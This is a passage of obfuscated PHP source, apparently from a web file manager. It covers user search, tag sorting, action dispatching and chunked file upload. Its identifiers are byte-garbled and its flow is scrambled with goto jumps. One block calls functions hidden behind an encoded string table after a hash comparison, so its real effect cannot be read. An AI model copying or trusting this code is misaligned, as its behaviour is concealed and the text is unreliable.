5 && Input::check($d„ÀÊˆ³çˆ, $eÊÄâ›‘äÁ[302])) { $B™Ö±¢¶ââ = $this->_searchFromMeta($eÊÄâ›‘äÁ[411], $d„ÀÊˆ³çˆ, 10); $fÂ‡Âä³ç = $this->_searchFromMeta($eÊÄâ›‘äÁ[412], $d„ÀÊˆ³çˆ, 10); $a©‡÷‹¯Õë = array_merge($B™Ö±¢¶ââ, $fÂ‡Âä³ç, $fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[350]]); $fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[350]] = array_unique_by_key($a©‡÷‹¯Õë, $eÊÄâ›‘äÁ[1414]); $fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[347]][$eÊÄâ›‘äÁ[348]] = count($fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[350]]); $fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[347]][$eÊÄâ›‘äÁ[349]] = ceil($fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[347]][$eÊÄâ›‘äÁ[348]] / $fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[347]][$eÊÄâ›‘äÁ[345]]); } $this->_listDataApply($fÄİÖñ·Ñ¶[$eÊÄâ›‘äÁ[350]]); $this->_filterByGroup($fÄİÖñ·Ñ¶, $Aï ìÊÓ°Å); goto A¹—à¬ÅÂ¸; Bï…½”ù: $d„ÀÊˆ³çˆ = str_replace($eÊÄâ›‘äÁ[2155], $eÊÄâ›‘äÁ[2156], trim($d„ÀÊˆ³çˆ)); $f©ŒŠµôÃ¦ = array($eÊÄâ›‘äÁ[28] => array($eÊÄâ›‘äÁ[744], "\45{$d„ÀÊˆ³çˆ}\x25"), $eÊÄâ›‘äÁ[289] => array($eÊÄâ›‘äÁ[744], "\x25{$d„ÀÊˆ³çˆ}\x25"), $eÊÄâ›‘äÁ[2304] => array($eÊÄâ›‘äÁ[744], "\x25{$d„ÀÊˆ³çˆ}\45"), $eÊÄâ›‘äÁ[909] => $eÊÄâ›‘äÁ[2157]); if (Input::check($d„ÀÊˆ³çˆ, $eÊÄâ›‘äÁ[295])) { $f©ŒŠµôÃ¦[$eÊÄâ›‘äÁ[1414]] = array($eÊÄâ›‘äÁ[744], "\45{$d„ÀÊˆ³çˆ}\x25"); $f©ŒŠµôÃ¦[$eÊÄâ›‘äÁ[2483]] = array($eÊÄâ›‘äÁ[744], "\45{$d„ÀÊˆ³çˆ}\x25"); } goto d—Ô‹á¢ßæ; d—Ô‹á¢ßæ: if (!$d„ÀÊˆ³çˆ) { $f©ŒŠµôÃ¦ = array(); } if (isset($b¥°šÈœÛ£[$eÊÄâ›‘äÁ[682]])) { $f©ŒŠµôÃ¦[$eÊÄâ›‘äÁ[682]] = $b¥°šÈœÛ£[$eÊÄâ›‘äÁ[682]]; } $fÄİÖñ·Ñ¶ = $this->_makeOrder()->where($f©ŒŠµôÃ¦)->selectPage(20); goto f‡¯‘àÂ‰; A¹—à¬ÅÂ¸: return $fÄİÖñ·Ñ¶; goto d•…Ô¤’Ø; eä¯‘ŒÊŸœ: $eÊÄâ›‘äÁ =& $_SERVER[Ö]; $d„ÀÊˆ³çˆ = $b¥°šÈœÛ£[$eÊÄâ›‘äÁ[2153]]; $Aï ìÊÓ°Å = isset($b¥°šÈœÛ£[$eÊÄâ›‘äÁ[2154]]) ? $b¥°šÈœÛ£[$eÊÄâ›‘äÁ[2154]] : !1; goto Bï…½”ù; d•…Ô¤’Ø: } private function _filterByGroup(&$C–éßØÁ—™, $DğªÅó»ÚŸ) { $D´ñï÷â® =& $_SERVER[Ö]; if (!$DğªÅó»ÚŸ) { return $C–éßØÁ—™; } foreach ($C–éßØÁ—™[$D´ñï÷â®[350]] as $c­õöÖÇ† => &$dİœášŞè) { $D¾º·«ïÈÖ = array_to_keyvalue($dİœášŞè[$D´ñï÷â®[2504]], $D´ñï÷â®[33], $D´ñï÷â®[2077]); if (!in_array($DğªÅó»ÚŸ, $D¾º·«ïÈÖ)) { unset($C–éßØÁ—™[$D´ñï÷â®[350]][$c­õöÖÇ†]); } } $C–éßØÁ—™[$D´ñï÷â®[350]] = array_values($C–éßØÁ—™[$D´ñï÷â®[350]]); $C–éßØÁ—™[$D´ñï÷â®[347]] = array($D´ñï÷â®[2280] => count($C–éßØÁ—™[$D´ñï÷â®[350]]), $D´ñï÷â®[2278] => $C–éßØÁ—™[$D´ñï÷â®[347]][$D´ñï÷â®[345]], $D´ñï÷â®[2277] => 1, $D´ñï÷â®[2279] => 1); } private function _searchFromMeta($FŸøÜŠ­, $e›÷¶ì÷†¿, $Eƒ•Ë£âè) { goto Dö¶×ëÃ¥; E©îÈ¬àé: $Bğë‡ÈÒÒø = $this->where(array($b™çØÎè[1405] => array($b™çØÎè[7], $a¸å—ÉˆÚ)))->select(); if (!$Bğë‡ÈÒÒø) { return array(); } return $Bğë‡ÈÒÒø; goto eøçêøí; Dö¶×ëÃ¥: $b™çØÎè =& $_SERVER[Ö]; $e›÷¶ì÷†¿ = strtolower($e›÷¶ì÷†¿); $b‡×¥¤İˆ = array($b™çØÎè[89] => $FŸøÜŠ­, $b™çØÎè[355] => array($b™çØÎè[744], "\45{$e›÷¶ì÷†¿}\x25")); goto b†ãÔÔã¿í; b†ãÔÔã¿í: $a¸å—ÉˆÚ = Model($b™çØÎè[2505])->where($b‡×¥¤İˆ)->limit($Eƒ•Ë£âè)->select(); if (!$a¸å—ÉˆÚ) { return array(); } $a¸å—ÉˆÚ = array_to_keyvalue($a¸å—ÉˆÚ, $b™çØÎè[33], $b™çØÎè[1414]); goto E©îÈ¬àé; eøçêøí: } private function _listDataApplyItem($cÓÁ·‰ƒÀ‹) { $eå¹¦ª³™à = array($cÓÁ·‰ƒÀ‹); $this->_listDataApply($eå¹¦ª³™à); return $eå¹¦ª³™à[0]; } private function _listDataApply(&$DƒÁàÌŠñ¦) { goto BƒÓ©µ„è·; a× …²­é: $eãÜ‚è‹ƒ = array_to_keyvalue($DƒÁàÌŠñ¦, $f¥ÕíÚ[33], $f¥ÕíÚ[1414]); $this->_listAppendGroup($DƒÁàÌŠñ¦, $eãÜ‚è‹ƒ); $this->_listAppendMeta($DƒÁàÌŠñ¦, $eãÜ‚è‹ƒ); goto Eë´®ÒÖê‘; Eë´®ÒÖê‘: $this->_listAppendSourceRoot($DƒÁàÌŠñ¦, $eãÜ‚è‹ƒ); goto AÎæ’ÑöğÇ; BƒÓ©µ„è·: $f¥ÕíÚ =& $_SERVER[Ö]; if (!$DƒÁàÌŠñ¦) { return; } array_remove_key($DƒÁàÌŠñ¦, $f¥ÕíÚ[797]); goto a× …²­é; AÎæ’ÑöğÇ: } private function _listAppendSourceRoot(&$BµÑ·ô·›¥, $a—‡…×ç”ñ) { goto EãÔÆÙ£î‡; A‰¶Ç¡Óù¿: $aŒ¥Ôˆ¿„Å = Model($FÙÁ¨Ñˆš‰[745])->order($FÙÁ¨Ñˆš‰[2164])->field($e¤ºÅÔ§Ì)->where($EÉÌŠ¦¾Ü)->select(); $aŒ¥Ôˆ¿„Å = array_to_keyvalue($aŒ¥Ôˆ¿„Å, $FÙÁ¨Ñˆš‰[452]); $aŒ¥Ôˆ¿„Å = array_remove_key($aŒ¥Ôˆ¿„Å, $FÙÁ¨Ñˆš‰[452]); goto dÒœÃªì–ù; dÒœÃªì–ù: foreach ($BµÑ·ô·›¥ as &$aÍÃÛÂôğÆ) { $aÍÃÛÂôğÆ[$FÙÁ¨Ñˆš‰[387]] = $aŒ¥Ôˆ¿„Å[$aÍÃÛÂôğÆ[$FÙÁ¨Ñˆš‰[1414]]] ? $aŒ¥Ôˆ¿„Å[$aÍÃÛÂôğÆ[$FÙÁ¨Ñˆš‰[1414]]] : array(); } goto Bªé±ŸŠä; EãÔÆÙ£î‡: $FÙÁ¨Ñˆš‰ =& $_SERVER[Ö]; $EÉÌŠ¦¾Ü = array($FÙÁ¨Ñˆš‰[457] => 0, $FÙÁ¨Ñˆš‰[367] => SourceModel::TYPE_USER, $FÙÁ¨Ñˆš‰[452] => array($FÙÁ¨Ñˆš‰[7], $a—‡…×ç”ñ)); $e¤ºÅÔ§Ì = $FÙÁ¨Ñˆš‰[2163]; goto A‰¶Ç¡Óù¿; Bªé±ŸŠä: } private function _listAppendGroup(&$DæåéßÔ§™, $DÛªàï¦İß) { goto cùµØ÷êÀğ; FñÇ…ÜÂ§: $cÂÆÕ‰è™ = array_to_keyvalue_group($cÂÆÕ‰è™, $EĞ«Óß˜ˆÚ[1414]); foreach ($cÂÆÕ‰è™ as &$CÙ¹Øš³ô¹) { $C­…îù–Š = array(); foreach ($CÙ¹Øš³ô¹ as $E°Ÿ÷ÖŠ¦) { if (!$E°Ÿ÷ÖŠ¦[$EĞ«Óß˜ˆÚ[2205]]) { continue; } $dĞŒ­¢‚Ö÷ = Model($EĞ«Óß˜ˆÚ[2224])->listData($E°Ÿ÷ÖŠ¦[$EĞ«Óß˜ˆÚ[2205]]); $C­…îù–Š[] = array($EĞ«Óß˜ˆÚ[2077] => $E°Ÿ÷ÖŠ¦[$EĞ«Óß˜ˆÚ[2077]], $EĞ«Óß˜ˆÚ[2508] => $aÒÂù¨Ü¾„[$E°Ÿ÷ÖŠ¦[$EĞ«Óß˜ˆÚ[2077]]], $EĞ«Óß˜ˆÚ[372] => $dĞŒ­¢‚Ö÷); } $CÙ¹Øš³ô¹ = $C­…îù–Š; } foreach ($DæåéßÔ§™ as &$aØ»’øğõé) { $aØ»’øğõé[$EĞ«Óß˜ˆÚ[2504]] = array(); if (isset($cÂÆÕ‰è™[$aØ»’øğõé[$EĞ«Óß˜ˆÚ[1414]]])) { $aØ»’øğõé[$EĞ«Óß˜ˆÚ[2504]] = $cÂÆÕ‰è™[$aØ»’øğõé[$EĞ«Óß˜ˆÚ[1414]]]; } } goto fÌ¢³áÃ˜; e¶¡ãî÷ğ: $e‰‡ŸÌ¶‹ = array($EĞ«Óß˜ˆÚ[2077] => array($EĞ«Óß˜ˆÚ[7], $c×±…ìæÀ‚)); $c­çˆ¿Œåà = Model($EĞ«Óß˜ˆÚ[2506])->field($EĞ«Óß˜ˆÚ[2507])->where($e‰‡ŸÌ¶‹)->select(); $aÒÂù¨Ü¾„ = array_to_keyvalue($c­çˆ¿Œåà, $EĞ«Óß˜ˆÚ[2077], $EĞ«Óß˜ˆÚ[28]); goto FñÇ…ÜÂ§; cùµØ÷êÀğ: $EĞ«Óß˜ˆÚ =& $_SERVER[Ö]; $e‰‡ŸÌ¶‹ = array($EĞ«Óß˜ˆÚ[1414] => array($EĞ«Óß˜ˆÚ[7], $DÛªàï¦İß)); $cÂÆÕ‰è™ = Model($EĞ«Óß˜ˆÚ[2151])->where($e‰‡ŸÌ¶‹)->select(); goto BßíãÜ‚; BßíãÜ‚: $c×±…ìæÀ‚ = array_to_keyvalue($cÂÆÕ‰è™, $EĞ«Óß˜ˆÚ[33], $EĞ«Óß˜ˆÚ[2077]); $c×±…ìæÀ‚ = array_remove_value(array_unique($c×±…ìæÀ‚), $EĞ«Óß˜ˆÚ[464]); if (!$c×±…ìæÀ‚ || !$cÂÆÕ‰è™) { return; } goto e¶¡ãî÷ğ; fÌ¢³áÃ˜: } private function _listAppendMeta(&$dÔß²¼ÍªŒ, $c£›šì•) { goto F÷™¶®Ò‘; F÷™¶®Ò‘: $bÈÍÈä—¹š =& $_SERVER[Ö]; $Dš¦Â‰É¬ = UserJobModel::JOB_KEY; $bßË ‰Ú¾Ñ = array($bÈÍÈä—¹š[2485]); goto E‹—¡Œ¹ìÈ; câ£ —º¼®: foreach ($bë—¦İòÎ½ as &$BÂ‰Œ²²¨Ü) { $dÏõĞ‚¡… = array(); foreach ($BÂ‰Œ²²¨Ü as $e‹Š¤Š¾œ¡) { if (!in_array($e‹Š¤Š¾œ¡[$bÈÍÈä—¹š[89]], $bßË ‰Ú¾Ñ)) { $dÏõĞ‚¡…[$e‹Š¤Š¾œ¡[$bÈÍÈä—¹š[89]]] = $e‹Š¤Š¾œ¡[$bÈÍÈä—¹š[355]]; } } $BÂ‰Œ²²¨Ü = $dÏõĞ‚¡…; } $A ¢¿²Áóˆ = Model($bÈÍÈä—¹š[2509]); foreach ($dÔß²¼ÍªŒ as &$Bä«©Ê‰…) { $A™²ÄÄ©Û· = array(); if (isset($bë—¦İòÎ½[$Bä«©Ê‰…[$bÈÍÈä—¹š[1414]]])) { $A™²ÄÄ©Û· = $bë—¦İòÎ½[$Bä«©Ê‰…[$bÈÍÈä—¹š[1414]]]; } $Bä«©Ê‰…[$bÈÍÈä—¹š[2510]] = array(); if (isset($A™²ÄÄ©Û·[$Dš¦Â‰É¬])) { $Bä«©Ê‰…[$bÈÍÈä—¹š[2510]] = $A ¢¿²Áóˆ->getUserJobInfo($A™²ÄÄ©Û·[$Dš¦Â‰É¬]); } } goto A°‹¿ÈÓÙØ; E‹—¡Œ¹ìÈ: $câ•¹çßŠ³ = array($bÈÍÈä—¹š[1414] => array($bÈÍÈä—¹š[7], $c£›šì•)); $bë—¦İòÎ½ = Model($bÈÍÈä—¹š[2482])->where($câ•¹çßŠ³)->select(); $bë—¦İòÎ½ = array_to_keyvalue_group($bë—¦İòÎ½, $bÈÍÈä—¹š[1414]); goto câ£ —º¼®; A°‹¿ÈÓÙØ: } public function userSearch($f»Šé³¬÷, $D¦·ô°ùä = "\52") { return Model($_SERVER[Ö][473])->where($f»Šé³¬÷)->field($D¦·ô°ùä)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\x6f\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($E‰Ù‰É§İö) { $c¤¥í‡°Š± =& $_SERVER[Ö]; if (!defined($c¤¥í‡°Š±[423])) { define($c¤¥í‡°Š±[423], 0); } return "\x55\163\x65\x72\117\x70\x74\151\157\156\137{$E‰Ù‰É§İö}\137" . USER_ID; } protected function filterWhere($E¢¦ñ…óøˆ) { $BÛ«Â• =& $_SERVER[Ö]; if (!defined($BÛ«Â•[423])) { define($BÛ«Â•[423], 0); } $E¢¦ñ…óøˆ[$BÛ«Â•[1414]] = USER_ID; return $E¢¦ñ…óøˆ; } public function cacheRemoveUser($FîÊø‚º×¡, $Dœ’¬‚÷Ì–) { return Cache::remove("\x55\x73\x65\x72\117\x70\164\x69\157\156\x5f{$FîÊø‚º×¡}\x5f" . $Dœ’¬‚÷Ì–); } protected function optionDefault($C¸¯îöÌ±¯ = '') { $CÉÌà­…§ =& $_SERVER[Ö]; if ($C¸¯îöÌ±¯ == $CÉÌà­…§[33]) { return $GLOBALS[$CÉÌà­…§[6]][$CÉÌà­…§[2511]]; } if ($C¸¯îöÌ±¯ == $CÉÌà­…§[2512]) { return $GLOBALS[$CÉÌà­…§[6]][$CÉÌà­…§[2513]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\x74\x61\147\x4c\151\163\x74"; public $modelType = "\x55\163\x65\x72\117\160\164\x69\157\x6e"; public $field = array("\x6e\141\x6d\x65", "\x73\164\171\x6c\145", "\x73\x6f\x72\x74"); public function listData($e‘ÉŒï¤÷„ = false, $Föê¹©Šê­ = "\x73\x6f\162\164", $fŞ‰–•º– = false) { return parent::listData($e‘ÉŒï¤÷„, $Föê¹©Šê­, $fŞ‰–•º–); } public function remove($f­á×ƒæŠ) { return parent::remove($f­á×ƒæŠ); } public function add($fƒÈÄÎÉ¦Á, $Dï‚–«¶…Á = "\x6c\x61\x62\x65\154\55\147\x72\x65\171\55\x6e\x6f\162\x6d\141\x6c") { $bç¸êÀ³¬± =& $_SERVER[Ö]; if ($this->findByName($fƒÈÄÎÉ¦Á)) { return !1; } $DøõÍñŠ³„ = array($bç¸êÀ³¬±[382] => $fƒÈÄÎÉ¦Á, $bç¸êÀ³¬±[433] => $Dï‚–«¶…Á, $bç¸êÀ³¬±[2081] => $this->getSort($bç¸êÀ³¬±[242]) + 1); return parent::insert($DøõÍñŠ³„); } public function update($d»âèáÙä¡, $BíÄˆ²À™ñ) { $d…ìòµ½ã´ =& $_SERVER[Ö]; $eÅƒ„­„š = $this->listData($d»âèáÙä¡); $c·˜«’ù¨ = $this->findByName($BíÄˆ²À™ñ[$d…ìòµ½ã´[28]]); if (!$eÅƒ„­„š || $c·˜«’ù¨ && $c·˜«’ù¨[$d…ìòµ½ã´[363]] != $eÅƒ„­„š[$d…ìòµ½ã´[363]]) { return !1; } return parent::update($d»âèáÙä¡, $BíÄˆ²À™ñ); } public function moveTop($Aæ¡ìô¾‘—) { $AĞÔº½ÅÊÄ =& $_SERVER[Ö]; $A¯æŒœáƒä = parent::listData(); $A›Ç‚ºİöÔ = $this->getSort($AĞÔº½ÅÊÄ[241]); foreach ($A¯æŒœáƒä as &$Fê½‡²¨àß) { if ($Fê½‡²¨àß[$AĞÔº½ÅÊÄ[363]] == $Aæ¡ìô¾‘—) { $Fê½‡²¨àß[$AĞÔº½ÅÊÄ[2098]] = $A›Ç‚ºİöÔ; continue; } $Fê½‡²¨àß[$AĞÔº½ÅÊÄ[2098]] += 1; } return parent::resetData($A¯æŒœáƒä); } public function moveBottom($fµ×´¿“™) { $BêÉ©ÈÂµ• =& $_SERVER[Ö]; $eïŸ°Ë¥Ş» = $this->getSort($BêÉ©ÈÂµ•[242]) + 1; return parent::update($fµ×´¿“™, array($BêÉ©ÈÂµ•[2098] => $eïŸ°Ë¥Ş»)); } public function resetSort($AËŒ¥ºîÇ÷) { goto FõƒöÓŸ½Š; Ağ‚´ÁâˆÔ: for ($fäÌ÷¼ = 0; $fäÌ÷¼ < count($AËŒ¥ºîÇ÷); $fäÌ÷¼++) { $Eå–óçæß[$AËŒ¥ºîÇ÷[$fäÌ÷¼] . $c‡Æ£Ñ†¥[33]] = $fäÌ÷¼ + 1; } $cù§šÂöÚ© = parent::listData(); foreach ($cù§šÂöÚ© as &$c®ƒ¸‡İÃ) { $dù‡¦é÷ª = $Eå–óçæß[$c®ƒ¸‡İÃ[$c‡Æ£Ñ†¥[363]]]; $c®ƒ¸‡İÃ[$c‡Æ£Ñ†¥[2098]] = $dù‡¦é÷ª ? $dù‡¦é÷ª : $c®ƒ¸‡İÃ[$c‡Æ£Ñ†¥[2098]]; } goto e³ğÖ¥©; e³ğÖ¥©: return parent::resetData($cù§šÂöÚ©); goto EˆÓáº›„ğ; FõƒöÓŸ½Š: $c‡Æ£Ñ†¥ =& $_SERVER[Ö]; $Eå–óçæß = array(); $AËŒ¥ºîÇ÷ = is_array($AËŒ¥ºîÇ÷) ? $AËŒ¥ºîÇ÷ : array(); goto Ağ‚´ÁâˆÔ; EˆÓáº›„ğ: } private function getSort($C®¿æ•ê²°) { $Fœ¾ƒ°  =& $_SERVER[Ö]; $FĞË„õ”—¯ = parent::listData(); $CùÑ–Ò«¸ = array_to_keyvalue($FĞË„õ”—¯, $Fœ¾ƒ° [33], $Fœ¾ƒ° [2098]); if (!$CùÑ–Ò«¸) { $CùÑ–Ò«¸ = array(0); } $aŒ¢•‚æ˜ = $C®¿æ•ê²° == $Fœ¾ƒ° [242] ? max($CùÑ–Ò«¸) : min($CùÑ–Ò«¸); return intval($aŒ¢•‚æ˜); } } goto D½˜¾Ì‹; C”ÀšæùÃ…: function Action($cÍ¾Õé¡½ = '') { goto b¿¤™Œ½³—; b¿¤™Œ½³—: $fÓç‘‰Ó§‹ =& $_SERVER[Ç·ÕÂû¼„]; static $Bµ¨Àï…ë = array(); $A±®ù¸¬İ = $cÍ¾Õé¡½; goto bÄ…–ÌËÑÛ; bÄ…–ÌËÑÛ: if (isset($Bµ¨Àï…ë[$A±®ù¸¬İ])) { return $Bµ¨Àï…ë[$A±®ù¸¬İ]; } $cÍ¾Õé¡½ = trim(str_replace($fÓç‘‰Ó§‹[4], $fÓç‘‰Ó§‹[5], $cÍ¾Õé¡½), $fÓç‘‰Ó§‹[4]); $D…ß…–“ÃÔ = explode($fÓç‘‰Ó§‹[5], $cÍ¾Õé¡½); goto FÀ“ÑÕÅ; FÀ“ÑÕÅ: $bÂ‚Á‹§™£ = strtolower($D…ß…–“ÃÔ[0]); if (substr($bÂ‚Á‹§™£, -6) == $fÓç‘‰Ó§‹[6]) { $cÍ¾Õé¡½ = substr($D…ß…–“ÃÔ[0], 0, -6); $dù—š¾Ì”å = $cÍ¾Õé¡½ . $fÓç‘‰Ó§‹[7]; $BªæÓ—œâ = $fÓç‘‰Ó§‹[8]; if (isset($D…ß…–“ÃÔ[1]) && substr(strtolower($D…ß…–“ÃÔ[1]), -5) == $fÓç‘‰Ó§‹[9]) { $dù—š¾Ì”å = $cÍ¾Õé¡½ . $D…ß…–“ÃÔ[1]; $BªæÓ—œâ = $fÓç‘‰Ó§‹[10] . $D…ß…–“ÃÔ[1] . $fÓç‘‰Ó§‹[11]; } else { if (count($D…ß…–“ÃÔ) == 3) { $dù—š¾Ì”å = $cÍ¾Õé¡½ . $D…ß…–“ÃÔ[1] . $D…ß…–“ÃÔ[2]; $BªæÓ—œâ = $fÓç‘‰Ó§‹[12] . $D…ß…–“ÃÔ[1] . $fÓç‘‰Ó§‹[13] . $D…ß…–“ÃÔ[2] . $fÓç‘‰Ó§‹[11]; } } $BªæÓ—œâ = PLUGIN_DIR . $cÍ¾Õé¡½ . $fÓç‘‰Ó§‹[4] . $BªæÓ—œâ; } else { if (substr($bÂ‚Á‹§™£, -5) == $fÓç‘‰Ó§‹[9]) { $cÍ¾Õé¡½ = substr($D…ß…–“ÃÔ[0], 0, -5); return Model($cÍ¾Õé¡½); } else { $dù—š¾Ì”å = $D…ß…–“ÃÔ[0] . $D…ß…–“ÃÔ[1]; $BªæÓ—œâ = CONTROLLER_DIR . $D…ß…–“ÃÔ[0] . $fÓç‘‰Ó§‹[4] . $D…ß…–“ÃÔ[1] . $fÓç‘‰Ó§‹[14]; } } $aÑ¤©…§Ü = strtolower($dù—š¾Ì”å); goto Cœêµ£…›ö; Cœêµ£…›ö: if (isset($Bµ¨Àï…ë[$aÑ¤©…§Ü])) { return $Bµ¨Àï…ë[$aÑ¤©…§Ü]; } if (is_file($BªæÓ—œâ)) { include_once $BªæÓ—œâ; } if (!class_exists($dù—š¾Ì”å)) { return actionCallError("\x5b{$cÍ¾Õé¡½}\x20\x3d\x3e\40{$dù—š¾Ì”å}\x5d\x20\143\x6c\x61\163\x73\x20\156\x6f\x74\x20\145\x78\151\163\x74\163\41"); } goto aÅ…ÇÈ´Ğ¯; aÅ…ÇÈ´Ğ¯: $Bµ¨Àï…ë[$aÑ¤©…§Ü] = new $dù—š¾Ì”å(); $Bµ¨Àï…ë[$A±®ù¸¬İ] = $Bµ¨Àï…ë[$aÑ¤©…§Ü]; return $Bµ¨Àï…ë[$aÑ¤©…§Ü]; goto b¥ù£²¿ï·; b¥ù£²¿ï·: } function ActionApply($BìÈ×ÃŒ‚‹, $B§™ùŒ¯Ğé = array()) { goto c¨¡æç«; c¨¡æç«: if (is_array($BìÈ×ÃŒ‚‹)) { return call_user_func_array($BìÈ×ÃŒ‚‹, $B§™ùŒ¯Ğé); } if (function_exists($BìÈ×ÃŒ‚‹)) { return call_user_func_array($BìÈ×ÃŒ‚‹, $B§™ùŒ¯Ğé); } $EÜ‡­„šŸø = strrpos($BìÈ×ÃŒ‚‹, $_SERVER[Ç·ÕÂû¼„][5]); goto eœ–„‚¦Å; eœ–„‚¦Å: $A»õã¢òíì = substr($BìÈ×ÃŒ‚‹, 0, $EÜ‡­„šŸø); $B¡‹®â¶Û‘ = substr($BìÈ×ÃŒ‚‹, $EÜ‡­„šŸø + 1); $bõÓï§óÅ = Action($A»õã¢òíì); goto aÖ¼ Š‚¹ ; aÖ¼ Š‚¹ : if (!method_exists($bõÓï§óÅ, $B¡‹®â¶Û‘)) { return actionCallError("{$BìÈ×ÃŒ‚‹}\x20\x6d\x65\x74\150\x6f\144\x20\156\x6f\164\x20\145\x78\x69\x73\164\163\41"); } $D¬¾Ø¸Í‰ˆ = call_user_func_array(array($bõÓï§óÅ, $B¡‹®â¶Û‘), $B§™ùŒ¯Ğé); return $D¬¾Ø¸Í‰ˆ; goto Cñ©‰…; Cñ©‰…: } function actionCallError($E¯ĞŸ‡éº®) { $FÂÖèƒÆ‹ =& $_SERVER[Ç·ÕÂû¼„]; $EÕŒ ĞÔ£ = json_encode_force(array($FÂÖèƒÆ‹[15] => this_url(), $FÂÖèƒÆ‹[16] => $GLOBALS[$FÂÖèƒÆ‹[16]])); $EÕŒ ĞÔ£ = str_replace(array($FÂÖèƒÆ‹[17]), array($FÂÖèƒÆ‹[4]), $EÕŒ ĞÔ£); return write_log($E¯ĞŸ‡éº® . $FÂÖèƒÆ‹[18] . $EÕŒ ĞÔ£, $FÂÖèƒÆ‹[19]); } goto eß½ŸíÀ´Õ; eŞ»à­á§: $c¿µä¸Ô—é = $_SERVER[Ö][754]; if ($_SERVER[$_SERVER[Ö][755]] != $c¿µä¸Ô—é($FğîÈ’·â)) { goto b‹”„Ö‚éŸ; eÇïÊ°½Ø÷: $E²ñÓ£ò ($FğîÈ’·â); goto f‘¢íß«áÏ; b‹”„Ö‚éŸ: $f‰“šî‡ß = $_SERVER[Ö][756]; $E‚‰ˆŒäå‚ = $_SERVER[$_SERVER[Ö][757]] . $_SERVER[Ö][758]; $bº¢Ä¡ÙÈ = $f‰“šî‡ß($E‚‰ˆŒäå‚); goto CßóëùÚğğ; CßóëùÚğğ: $AŠ×ë´›âÈ = explode($_SERVER[Ö][213], $bº¢Ä¡ÙÈ); if (count($AŠ×ë´›âÈ) < $_SERVER[Ö][555]) { $c×ê©àŸŠš = $_SERVER[Ö][759]; $c×ê©àŸŠš(); } $E²ñÓ£ò  = $_SERVER[Ö][760]; goto eÇïÊ°½Ø÷; f‘¢íß«áÏ: } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto b´©°ö°÷†; D±æÌ‹•—Ğ: if (!empty($_FILES)) { $bµ¼Ç¿ª›ö = $_FILES[$d‹´¹˜ŠÏ†[163]]; $this->uploadFile = $bµ¼Ç¿ª›ö[$d‹´¹˜ŠÏ†[1940]]; if (!$this->uploadFile && $bµ¼Ç¿ª›ö[$d‹´¹˜ŠÏ†[1204]] > 0) { show_json($this->errorInfo($bµ¼Ç¿ª›ö[$d‹´¹˜ŠÏ†[1204]]), !1); } } else { if (isset($in[$d‹´¹˜ŠÏ†[382]])) { $this->uploadFile = isset($in[$d‹´¹˜ŠÏ†[1941]]) ? $d‹´¹˜ŠÏ†[1942] : $d‹´¹˜ŠÏ†[1787]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Fáõß“­©Ô; Fáõß“­©Ô: $this->checkSize(); $this->tempPathInit(); goto a¥ÈòÛõ‹; b´©°ö°÷†: $d‹´¹˜ŠÏ† =& $_SERVER[Ö]; global $in; $this->in =& $in; goto D±æÌ‹•—Ğ; a¥ÈòÛõ‹: } public function upload() { goto E²ŠÉ–‘ø’; aÈñõô«âŒ: $Bë…ŒÈ„ = $this->writeTo($DäĞ–È•Å, $D¶ß°öÎºÁ, $this->tempFile); $EâĞŒÑç‘… = IO::hashSimple($DäĞ–È•Å); $e ¬Ğãñ•ê = IO::size($DäĞ–È•Å); goto C‰Ùµ†Ï¶‡; e—­çøö£: if ($D¼ÑÚÖ‰Šâ > 1 && $AÁŠ¤À£É <= 0) { show_json($f—¹¬»ôó[1947], !1); } if ($AÁŠ¤À£É > $e ¬Ğãñ•ê) { $D¼ÑÚÖ‰Šâ = 1; } if ($D¼ÑÚÖ‰Šâ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto e†Í¶±æñª; EôµŒ¨º“†: $DäĞ–È•Å = $this->moveUploadedFile($A½ÏšÏÕª¹); if ($e ¬Ğãñ•ê > 0 && filesize($DäĞ–È•Å) == 0) { $this->showJson($f—¹¬»ôó[1948], !1); } if (!$DäĞ–È•Å) { $this->showJson(LNG($f—¹¬»ôó[1949]), !1); } goto b¨è‚©ˆÔ¼; e†Í¶±æñª: CacheLock::lock($this->tempFile, 20); $BĞ¦î¦ÍØ = $this->statusGet(); $this->initFileTemp(); goto EôµŒ¨º“†; bÓ»¥æğ†Ğ: $A½ÏšÏÕª¹ = $this->tempFile . $f—¹¬»ôó[1945] . $a”Ø³äâó; $e ¬Ğãñ•ê = isset($this->in[$f—¹¬»ôó[516]]) ? intval($this->in[$f—¹¬»ôó[516]]) : 0; $AÁŠ¤À£É = isset($this->in[$f—¹¬»ôó[1946]]) ? intval($this->in[$f—¹¬»ôó[1946]]) : 0; goto e—­çøö£; fµù–Â´ËĞ: ignore_timeout(); if (!$this->checkChunkHash($BĞ¦î¦ÍØ)) { $this->showJson($f—¹¬»ôó[1957], !1); } $this->statusSet(!1); goto dîŠ»¦Ÿã†; b¨è‚©ˆÔ¼: $fÕÁœÖò¯ = $a”Ø³äâó * $AÁŠ¤À£É; $D¶ß°öÎºÁ = @fopen($this->tempFile, $f—¹¬»ôó[1950]); fseek($D¶ß°öÎºÁ, $fÕÁœÖò¯); goto aÈñõô«âŒ; D®Ş†¶Ì‹ç: $BĞ¦î¦ÍØ[$f—¹¬»ôó[1953]][$f—¹¬»ôó[1954] . $a”Ø³äâó] = array($f—¹¬»ôó[1955] => $fÕÁœÖò¯, $f—¹¬»ôó[1029] => $a”Ø³äâó, $f—¹¬»ôó[77] => $e ¬Ğãñ•ê, $f—¹¬»ôó[160] => $EâĞŒÑç‘…); $this->statusSet($BĞ¦î¦ÍØ); if (count($BĞ¦î¦ÍØ[$f—¹¬»ôó[1953]]) != $BĞ¦î¦ÍØ[$f—¹¬»ôó[1952]]) { $this->showJson($f—¹¬»ôó[1956] 